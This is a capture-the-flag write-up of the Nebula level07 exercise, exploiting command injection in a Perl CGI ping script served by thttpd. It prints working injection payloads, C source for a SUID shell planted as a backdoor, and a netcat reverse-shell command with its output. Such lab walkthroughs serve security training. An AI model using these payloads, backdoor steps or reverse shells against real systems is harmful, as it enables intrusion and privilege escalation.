+++
author = "pwntester"
categories = ["nebula07"]
date = 2013-11-21T17:13:00Z
description = ""
draft = false
slug = "nebula-level07-write-up"
tags = ["nebula07"]
title = "Nebula level07 write-up"

+++

In [Level07](http://exploit-exercises.com/nebula/level07) we are given the source code of a **perl** script:

```lang-bash line-numbers 
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));

```

It looks like its vulnerable to **command injection** on line 12. Bit how and where is it deployed. Along with the script code we are given the following file:

```lang-bash line-numbers 
level07@nebula:/home/flag07$ cat thttpd.conf
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07

# Do a chroot() at initialization time, restricting file access to the program's
# current directory. If chroot is the compiled-in default (not the case on
# Debian), then nochroot disables it. See thttpd(8) for details.
nochroot
#chroot

# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
# you might as well do a single chdir() with the dir option. If you are
# chrooting, this lets you put the web files in a subdirectory of the chroot
# tree, instead of in the top level mixed in with the chroot files.
#data_dir=

# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
# any symbolic links in filenames, to check that the resulting path stays within
# the original document tree. If you want to turn off this check and save some
# CPU time, you can use the nosymlinks option, however this is not
# recommended. Note, though, that if you are using the chroot option, the
# symlink checking is unnecessary and is turned off, so the safe way to save
# those CPU cycles is to use chroot.
#symlinks
#nosymlinks

# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=flag07

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a "Cache-Control: max-age"
# header to be returned with all responses. An equivalent "Expires" header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
```

So it looks like the port **7007** has a http daemon serving **/home/flag07** and that the daemon is run as **flag07** user.... thats basically all we need.
If we connect to the server, we can ping any host like:

{% img /images/pinglocalhost.png 565 168 %}

Now all we need to do to get the flag is accessing **index.cgi?Host=localhost%3bgetflag**:

{% img /images/pinglocalhostgetflag.png 571 187 %}

Now, if we want to get a shell we can create a program like:

```lang-clike line-numbers 
#include <unistd.h>
#include <stdlib.h>

int main()
{
    int euid = geteuid();

    setresuid(euid, euid, euid);
    system("sh");
    return 0;
}
```

Compile it and move it to /tmp:

```lang-bash line-numbers 
level07@nebula:~$ gcc shell.c -o shell
level07@nebula:~$ cp shell /tmp/shell
```

Now make the **flag07** user to set the SUID flag on it by using the command injection to run the following commands:

```lang-bash line-numbers 
; cp /tmp/shell /home/flag07/shell; chmod +s /home/flag07/shell
```

Now inject the above command (Dont forget to URL encode it) and look for your backdoot at **/home/flag07**

```lang-bash line-numbers 
level07@nebula:/home/flag07$ ls -la
total 36
drwxr-x---  2 flag07 level07 4096 Nov 21 09:52 .
drwxr-xr-x 43 root   root    4096 Nov 20  2011 ..
-rw-r--r--  1 flag07 flag07   220 May 18  2011 .bash_logout
-rw-r--r--  1 flag07 flag07  3353 May 18  2011 .bashrc
-rw-r--r--  1 flag07 flag07   675 May 18  2011 .profile
-rwxr-xr-x  1 root   root     368 Nov 20  2011 index.cgi
-rwsr-sr-x  1 flag07 flag07  7241 Nov 21 09:52 shell
-rw-r--r--  1 root   root    3719 Nov 20  2011 thttpd.conf
level07@nebula:/home/flag07$ ./shell
sh-4.2$ id
uid=992(flag07) gid=1008(level07) egid=992(flag07) groups=992(flag07),1008(level07)
```

Other way to do it is using **netcat**. Just run a **nc** listening on any port for your **flag07** shell:

```lang-bash line-numbers 
level07@nebula:/home/flag07$ nc -nvlp 6666
listening on [any] 6666 ...
```

Now use the command injection to run connect to your listening **netcat** and send it the reverse shell:

```lang-bash line-numbers 
; nc localhost 6666 -e /bin/sh
```

```lang-bash line-numbers 
level07@nebula:/home/flag07$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43686
id
uid=992(flag07) gid=992(flag07) groups=992(flag07)
```

